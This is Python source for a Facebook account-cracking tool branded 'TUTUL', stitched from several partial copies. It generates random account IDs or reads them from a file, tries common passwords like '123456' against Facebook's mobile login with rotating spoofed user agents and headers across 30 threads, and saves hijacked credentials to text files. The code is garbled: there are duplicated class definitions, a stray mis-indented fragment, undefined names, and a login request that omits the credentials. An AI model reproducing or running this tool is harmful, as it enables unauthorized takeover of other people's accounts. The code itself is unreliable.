import os
import time

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        self.home_menu()

    def home_menu(self):
        os.system("clear")
        
        # Header Info
        print("====================================")
        print(" Author   : Haroon Sadat")
        print(" Github   : Afghan Technical")
        print(" Facebook : Haroon Sadat Profile")
        print("====================================")
        
        # Main Menu Options
        print("\n [1] File Cloning")
        print(" [2] Public Cloning")
        print(" [3] Create File")
        print(" [4] Exit")
        print("====================================")
        
        # Getting User Input
        user_choice = input("\n Choose Option : ")
        
        if user_choice == "1":
            print("\n Starting File Cloning...")
            time.sleep(2)
        elif user_choice == "2":
            print("\n Starting Public Cloning...")
            time.sleep(2)
        elif user_choice == "3":
            print("\n Creating File...")
            time.sleep(2)
        elif user_choice == "4":
            print("\n Exiting Tool. Goodbye!")
            exit()
        else:
            print("\n Invalid Option! Try Again.")
            time.sleep(2)
                    pw = pw.lower()
        ses.headers.update({"Host":'mbasic.facebook.com'})
        p = ses.get('https://mbasic.facebook.com/login.php')
        dataa = {"lsd":re.search('name="lsd" value="(.*?)"', p.text).group(1)}
        ses.headers.update({"Host":'mbasic.facebook.com'})
        po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=dataa)
        if "checkpoint" in po.cookies.get_dict().keys():
            print(f'\r\x1b[1;91m [ Tutul-CP ] {idf} | {pw}')
            open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
            akun.append(idf+'|'+pw)
            break
        elif "c_user" in ses.cookies.get_dict().keys():
            coki=po.cookies.get_dict()
            coki = (";").join([ "%s=%s" % (key, value) for key, value in coki.items() ])
            print(f'\r\x1b[1;92m [ Tutul-OK ] {idf} | {pw}')
            wrt =('%s - %s' % (idf,pw))
            ok.append(wrt)
            open('/sdcard/ids.txt', 'a').write(wrt+'\n')
            follow(ses,coki)
            break
        else:
            continue
    except requests.exceptions.ConnectionError:
        time.sleep(31)
loop+=1

def follow(ses,coki):
    pass


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\n [1] File Cloning")
        print(" [2] Public Cloning")
        print(" [3] Create File")
        print(" [4] 2008-9 Cloning")
        print(" [5] 2011-14 Cloning")
        print(" [6] 2004-2005 Cloning Paid")
        print(" [7] 2006-2007 Cloning Paid")
        print(" [E] Exit Programming\n")
        TUTUL = input(" Choose : ")
        if TUTUL in ["1", "01"]:
            File()
        if TUTUL in ["2", "02"]:
            Public()
        if TUTUL in ["3", "03"]:
            os.system("python Dump.py")
        if TUTUL in ["4", "04"]:
            self.old()
        if TUTUL in ["5", "05"]:
            self.old2()
            exit()
        else:
            print (" Select Correctly ")
            time.sleep(1)
import os
import re
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# USER-AGENT LISTS & SESSIONS
# ==========================================

# Compiled from images 1, 2, 3, 4, 5, and 7
user_agents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A)",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217A)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0)",
    "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L)",
    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L)",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H)",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H)",
    "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C)",
    "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900A Build/LRX21V)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920A Build/LMY47X)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910A Build/LMY47X)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925A Build/LMY47X)",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c)",
    "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; HTC_0P6B120 Build/KTU84L)",
    "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; LG-D851 Build/KVT49L.D85110r)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3",
    "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_hosted_uri.scheme)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3)",
    "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17)",
    "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; SonyEricssonX10i Build/3.0.1.G.0.75)",
    "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei U8666-51)",
    "Mozilla/5.0 (Android; Mobile Huawei X3; rv:15.0)",
    "Mozilla/5.0 (Linux; U; Android 2.3.7; sv-se; SonyEricssonST18i)",
    "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932 Build/OPR1.170618.016)",
    "nokia-7.1-safari",
    "NOKIA6120c/UCBrowser/8.7.1.234/28/444",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9300T Build/JZO54K)",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9300 Build/JZO54K)",
    "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730 Build/JZO54K)",
    "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I Build/KOT49H)",
    "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; HIGHSCREEN ALPHA GTR Build/IMM76D)",
    "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
    "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/10.0",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8)",
    "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0",
    "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/10.0",
    "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
    "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0 FirefoxOS/1.2",
    "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0 FirefoxOS/1.2",
    "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
    "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8",
    "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
    "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko)"
]

# Structural placeholder for header configurations matching image 5
def setup_headers():
    headers = {
        "x-fb-connection-bandwidth": str(random.randint(2000000, 3000000)),
        "x-fb-sim-hni": str(random.randint(20000, 30000)),
        "x-fb-net-hni": str(random.randint(20000, 30000)),
        "x-fb-features": "23",
        "user-agent": random.choice(user_agents)
    }
    return headers

# ==========================================
# PROCESSING METHODS & EXECUTION LOOPS
# ==========================================

# Execution display block corresponding to Image 5
def display_status(ok_count, cp_count):
    sys.stdout.write(f"\r [ Tutul ] %s/%s -> Ok:-%s - Cp:-%s " % (loop, len(id_list), ok_count, cp_count))
    sys.stdout.flush()

# Structural target block matching logic from Image 6
def old2(self):
    x = 1111111111
    xx = 9999999999
    idx = "10000"
    os.system('clear')
    print(logo)
    limit = int(input("\n \033[0;95m[+]\\033[0m Enter Limit: "))
    try:
        for n in range(limit):
            _ = random.randint(x, xx)
            __ = idx
            self.id.append(__ + str(_))
            
        print("\033[0;93m [+] TOTAL ID -> " + str(len(self.id)))
        with ThreadPoolExecutor(max_workers=30) as executor:
            print("\n\033[1;32m [!] USE (123456) AS PASSWORD")
            listpass = input("%s [?] ENTER PASSWORD: ")
            if len(listpass) <= 5:
                exit("\n%s [!] PASSWORD MINIMUM LENGTH IS 6")
            print("%s [*] CRACK WITH PASSWORD INITIALIZED...")
            os.system("clear")
            print(logo)
            print("\n%s [+] OK RESULTS SAVED IN OK.TXT")
            print("%s [+] CP RESULTS SAVED IN CP.TXT")
    except Exception as e:
        pass

# Outer operational control tracker loops
def continue_loop():
    while True:
        try:
            # Main sequence execution
            pass
        except Exception:
            continue
        loop += 1
import os
import re
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# FILE IMPLEMENTATIONS & UTILITIES
# ==========================================

def File():
    os.system("clear")
    print(logo)
    print("\n [1] Auto File Clone")
    print(" [2] Manual File Clone")
    print(" [B] Back to Menu\n")
    choose = input(" Choose : ")
    if choose in ["1", "01"]:
        auto_file()
    elif choose in ["2", "02"]:
        manual_file()
    else:
        Main()

def auto_file():
    os.system("clear")
    print(logo)
    print("\n [*] PUT FILE PATH (e.g., /sdcard/file.txt)")
    file_path = input(" Path : ")
    try:
        file_data = open(file_path, "r").read().splitlines()
    except FileNotFoundError:
        print(" [!] File Not Found")
        time.sleep(1)
        auto_file()
    
    os.system("clear")
    print(logo)
    print("\n [*] TOTAL IDS : " + str(len(file_data)))
    print(" [*] CRACKING STARTED...")
    print("-----------------------------------------")
    
    with ThreadPoolExecutor(max_workers=30) as pool:
        for user in file_data:
            username = user.split("|")[0]
            password_list = ["first123", "first1234", "first12345"]
            pool.submit(crack_logic, username, password_list)

def manual_file():
    pass

def Public():
    os.system("clear")
    print(logo)
    print("\n [*] ENTER PUBLIC ID TO DUMP")
    public_id = input(" ID : ")
    # Logic for dumping public IDs
    pass

# ==========================================
# CRACK LOGIC & SESSION MANAGEMENT
# ==========================================

def crack_logic(idf, pwx):
    global loop, ok, cp
    sys.stdout.write(f"\r [ Tutul ] {loop}/{len(id_list)} -> Ok:-{len(ok)} - Cp:-{len(cp)} ")
    sys.stdout.flush()
    
    for pw in pwx:
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({
            "Host": "mbasic.facebook.com",
            "x-fb-connection-bandwidth": str(random.randint(2000000, 3000000)),
            "x-fb-sim-hni": str(random.randint(20000, 30000)),
            "x-fb-net-hni": str(random.randint(20000, 30000)),
            "x-fb-features": "23",
            "user-agent": random.choice(user_agents)
        })
        
        try:
            p = ses.get('https://mbasic.facebook.com/login.php')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', p.text).group(1)}
            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=dataa)
            
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;91m [ Tutul-CP ] {idf} | {pw}')
                open('CP/'+cpc, 'a').write(idf+'|'+pw+'\n')
                cp.append(idf+'|'+pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                coki = po.cookies.get_dict()
                coki = (";").join([ "%s=%s" % (key, value) for key, value in coki.items() ])
                print(f'\r\x1b[1;92m [ Tutul-OK ] {idf} | {pw}')
                wrt = ('%s - %s' % (idf, pw))
                ok.append(wrt)
                open('/sdcard/ids.txt', 'a').write(wrt+'\n')
                follow(ses, coki)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def follow(ses, coki):
    pass

# ==========================================
# MAIN INTERFACE & METHODS
# ==========================================

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\n [1] File Cloning")
        print(" [2] Public Cloning")
        print(" [3] Create File")
        print(" [4] 2008-9 Cloning")
        print(" [5] 2011-14 Cloning")
        print(" [6] 2004-2005 Cloning Paid")
        print(" [7] 2006-2007 Cloning Paid")
        print(" [E] Exit Programming\n")
        TUTUL = input(" Choose : ")
        if TUTUL in ["1", "01"]:
            File()
        elif TUTUL in ["2", "02"]:
            Public()
        elif TUTUL in ["3", "03"]:
            os.system("python Dump.py")
        elif TUTUL in ["4", "04"]:
            self.old()
        elif TUTUL in ["5", "05"]:
            self.old2()
        elif TUTUL in ["E", "e"]:
            exit()
        else:
            print(" Select Correctly ")
            time.sleep(1)
            Main()

    def old(self):
        x = 11111111
        xx = 99999999
        idx = "100000"
        os.system('clear')
        print(logo)
        limit = int(input("\n \033[0;95m[+] Enter Limit: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
                
            print("\033[0;93m [+] TOTAL ID -> " + str(len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as executor:
                print("\n\033[1;32m [!] USE (123456) AS PASSWORD")
                listpass = input(" [?] ENTER PASSWORD: ")
                if len(listpass) <= 5:
                    exit("\n [!] PASSWORD MINIMUM LENGTH IS 6")
                print(" [*] CRACK WITH PASSWORD INITIALIZED...")
                os.system("clear")
                print(logo)
        except Exception as e:
            pass

    def old2(self):
        x = 1111111111
        xx = 9999999999
        idx = "10000"
        os.system('clear')
        print(logo)
        limit = int(input("\n \033[0;95m[+] Enter Limit: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
                
            print("\033[0;93m [+] TOTAL ID -> " + str(len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as executor:
                print("\n\033[1;32m [!] USE (123456) AS PASSWORD")
                listpass = input(" [?] ENTER PASSWORD: ")
                if len(listpass) <= 5:
                    exit("\n [!] PASSWORD MINIMUM LENGTH IS 6")
                print(" [*] CRACK WITH PASSWORD INITIALIZED...")
                os.system("clear")
                print(logo)
                print("\n [+] OK RESULTS SAVED IN OK.TXT")
                print(" [+] CP RESULTS SAVED IN CP.TXT")
        except Exception as e:
            pass

# Global execution properties
logo = "### TUTUL TOOL ###"
loop = 0
id_list = []
ok = []
cp = []
cpc = "cp.txt"

if __name__ == "__main__":
    Main()

